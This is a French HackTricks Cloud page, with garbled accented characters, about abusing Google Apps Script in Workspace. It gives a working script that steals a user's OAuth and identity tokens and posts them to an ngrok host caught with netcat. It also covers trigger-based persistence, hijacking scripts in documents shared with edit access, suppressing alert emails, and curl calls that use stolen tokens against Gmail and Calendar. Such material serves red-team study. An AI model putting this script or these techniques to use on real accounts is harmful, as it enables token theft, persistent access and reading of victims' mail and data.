# GWS - Scripts d'application

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge HackTricks AWS)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Scripts d'application

Les Scripts d'application sont du **code qui sera d√©clench√© lorsqu'un utilisateur avec la permission d'√©diteur acc√®de au document li√© au Script d'application** et apr√®s **avoir accept√© la demande OAuth**.\
Ils peuvent √©galement √™tre configur√©s pour √™tre **ex√©cut√©s √† intervalles r√©guliers** par le propri√©taire du Script d'application (Persistance).

### Cr√©er un Script d'application

Il existe plusieurs fa√ßons de cr√©er un Script d'application, bien que les plus courantes soient √† partir d'un **Document Google (de n'importe quel type)** et en tant que **projet autonome**:

<details>

<summary>Cr√©er un projet li√© au conteneur √† partir de Docs, Sheets ou Slides Google</summary>

1. Ouvrez un document Docs, une feuille de calcul Sheets ou une pr√©sentation Slides.
2. Cliquez sur **Extensions** > **Google Apps Script**.
3. Dans l'√©diteur de script, cliquez sur **Projet sans titre**.
4. Donnez un nom √† votre projet et cliquez sur **Renommer**.

</details>

<details>

<summary>Cr√©er un projet autonome</summary>

Pour cr√©er un projet autonome √† partir de Apps Script:

1. Allez sur [`script.google.com`](https://script.google.com/).
2. Cliquez sur **Nouveau Projet**.
3. Dans l'√©diteur de script, cliquez sur **Projet sans titre**.
4. Donnez un nom √† votre projet et cliquez sur **Renommer**.

</details>

<details>

<summary>Cr√©er un projet autonome √† partir de Google Drive</summary>

1. Ouvrez [Google Drive](https://drive.google.com/).
2. Cliquez sur **Nouveau** > **Autre** > **Google Apps Script**.

</details>

<details>

<summary>Cr√©er un projet li√© au conteneur √† partir de Google Forms</summary>

1. Ouvrez un formulaire dans Google Forms.
2. Cliquez sur Plus more\_vert > **√âditeur de script**.
3. Dans l'√©diteur de script, cliquez sur **Projet sans titre**.
4. Donnez un nom √† votre projet et cliquez sur **Renommer**.

</details>

<details>

<summary>Cr√©er un projet autonome en utilisant l'outil en ligne de commande clasp</summary>

`clasp` est un outil en ligne de commande qui vous permet de cr√©er, extraire/pousser et d√©ployer des projets Apps Script depuis un terminal.

Consultez le [Guide de l'interface en ligne de commande en utilisant `clasp`](https://developers.google.com/apps-script/guides/clasp) pour plus de d√©tails.

</details>

## Sc√©nario de Script d'application <a href="#create-using-clasp" id="create-using-clasp"></a>

### Cr√©er une feuille Google avec un Script d'application

Commencez par cr√©er un Script d'application, ma recommandation pour ce sc√©nario est de cr√©er une feuille Google et d'aller √† **`Extensions > Scripts d'application`**, cela ouvrira un **nouveau Script d'application li√© √† la feuille**.

### Fuite de jeton

Pour donner acc√®s au jeton OAuth, vous devez cliquer sur **`Services +` et ajouter des √©tendues comme**:

* **AdminDirectory**: Acc√©der aux utilisateurs et groupes du r√©pertoire (si l'utilisateur a suffisamment de permissions)
* **Gmail**: Pour acc√©der aux donn√©es de Gmail
* **Drive**: Pour acc√©der aux donn√©es de Drive
* **Google Sheets API**: Pour que cela fonctionne avec le d√©clencheur

Pour modifier vous-m√™me les **√©tendues n√©cessaires**, vous pouvez aller dans les param√®tres du projet et activer: **`Afficher le fichier manifest "appsscript.json" dans l'√©diteur`.**
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Pour capturer la requ√™te, vous pouvez simplement ex√©cuter :
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Permissions requested to execute the App Script:

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Lorsqu'une demande externe est effectu√©e, la bo√Æte de dialogue OAuth demandera √©galement **l'autorisation d'acc√©der √† des points de terminaison externes**.
{% endhint %}

### Cr√©er un d√©clencheur

Une fois l'application lue, cliquez sur **‚è∞ D√©clencheurs** pour cr√©er un d√©clencheur. Pour la **fonction** √† ex√©cuter, choisissez **`getToken`**, ex√©cutez au d√©ploiement **`Head`**, dans la source d'√©v√©nement s√©lectionnez **`√Ä partir de la feuille de calcul`** et le type d'√©v√©nement s√©lectionnez **`√Ä l'ouverture`** ou **`√Ä la modification`** (selon vos besoins) et enregistrez.

Notez que vous pouvez v√©rifier les **ex√©cutions des scripts de l'application dans l'onglet Ex√©cutions** si vous souhaitez d√©boguer quelque chose.

### Partage

Pour **d√©clencher** le **script de l'application**, la victime doit se connecter avec un **acc√®s en tant qu'√©diteur**.

{% hint style="success" %}
Le **jeton** utilis√© pour ex√©cuter le **script de l'application** sera celui du **cr√©ateur du d√©clencheur**, m√™me si le fichier est ouvert en tant qu'√©diteur par d'autres utilisateurs.
{% endhint %}

### Abus des documents partag√©s avec moi

{% hint style="danger" %}
Si quelqu'un **partage avec vous un document avec des scripts d'application et un d√©clencheur utilisant le Head** du script de l'application (pas un d√©ploiement fixe), vous pouvez modifier le code du script de l'application (en ajoutant par exemple les fonctions de vol de jeton), y acc√©der, et le **script de l'application sera ex√©cut√© avec les autorisations de l'utilisateur qui a partag√© le document avec vous** ! (notez que le jeton OAuth du propri√©taire aura comme √©tendue d'acc√®s celles donn√©es lors de la cr√©ation du d√©clencheur).

Une **notification sera envoy√©e au cr√©ateur du script indiquant que quelqu'un a modifi√© le script** (Et si on utilisait les autorisations Gmail pour g√©n√©rer un filtre afin d'√©viter l'alerte ?)
{% endhint %}

{% hint style="success" %}
Si un **attaquant modifie les √©tendues du script de l'application**, les mises √† jour **ne seront pas appliqu√©es** au document tant qu'un **nouveau d√©clencheur** avec les modifications n'est pas cr√©√©. Par cons√©quent, un attaquant ne pourra pas voler le jeton du cr√©ateur avec plus d'√©tendues que celles qu'il a d√©finies dans le d√©clencheur qu'il a cr√©√©.
{% endhint %}

### Copier au lieu de partager

Lorsque vous cr√©ez un lien pour partager un document, un lien similaire √† celui-ci est cr√©√© : `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Si vous **modifiez** la fin **"/edit"** en **"/copy"**, au lieu d'y acc√©der, Google vous demandera si vous souhaitez **g√©n√©rer une copie du document :**

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

Si l'utilisateur le copie et y acc√®de, √† la fois le **contenu du document et les scripts d'application seront copi√©s**, cependant les **d√©clencheurs ne le seront pas**, donc **rien ne sera ex√©cut√©**.

### Partage en tant qu'application Web

Notez qu'il est √©galement possible de **partager un script d'application en tant qu'application Web** (dans l'√âditeur du script d'application, d√©ployez en tant qu'application Web), mais une alerte comme celle-ci appara√Ætra :

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

Suivie de la **bo√Æte de dialogue OAuth typique demandant** les autorisations n√©cessaires.

### Test

Vous pouvez tester un jeton collect√© pour lister les e-mails avec :

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Lister le calendrier de l'utilisateur :
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## Script d'application comme persistance

Une option pour la persistance serait de **cr√©er un document et ajouter un d√©clencheur pour la fonction getToken** et partager le document avec l'attaquant afin que chaque fois que l'attaquant ouvre le fichier, il **exfiltre le jeton de la victime**.

Il est √©galement possible de cr√©er un Script d'application et de le d√©clencher toutes les X temps (comme chaque minute, heure, jour...). Un attaquant qui a **compromis des identifiants ou une session d'une victime pourrait d√©finir un d√©clencheur temporel pour un Script d'application et divulguer un jeton OAuth tr√®s privil√©gi√© chaque jour** :

Il suffit de cr√©er un Script d'application, d'aller dans D√©clencheurs, de cliquer sur Ajouter un d√©clencheur, et de s√©lectionner comme source d'√©v√©nement Temporel et de choisir les options qui vous conviennent le mieux :

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Cela cr√©era une alerte de s√©curit√© par e-mail et un message push sur votre mobile vous alertant √† ce sujet.
{% endhint %}

### Contournement de la demande non v√©rifi√©e de document partag√©

De plus, si quelqu'un vous a **partag√©** un document avec un **acc√®s en tant qu'√©diteur**, vous pouvez g√©n√©rer des **Scripts d'application √† l'int√©rieur du document** et le **PROPRI√âTAIRE (cr√©ateur) du document sera le propri√©taire du Script d'application**.

{% hint style="warning" %}
Cela signifie que le **cr√©ateur du document appara√Ætra comme cr√©ateur de tout Script d'application** que toute personne ayant un acc√®s en tant qu'√©diteur cr√©e √† l'int√©rieur.

Cela signifie √©galement que le **Script d'application sera approuv√© par l'environnement Workspace** du cr√©ateur du document.
{% endhint %}

{% hint style="danger" %}
Cela signifie √©galement que si un **Script d'application existait d√©j√†** et que des personnes ont **accord√© l'acc√®s**, toute personne ayant la permission **√âditeur** sur le document peut **le modifier et en abuser**.\
Pour abuser de cela, vous avez √©galement besoin que des personnes d√©clenchent le Script d'application. Et un petit truc est de **publier le script en tant qu'application web**. Lorsque les **personnes** qui ont d√©j√† **accord√© l'acc√®s** au Script d'application acc√®dent √† la page web, elles vont **d√©clencher le Script d'application** (cela fonctionne √©galement en utilisant des balises `<img>`).
{% endhint %}
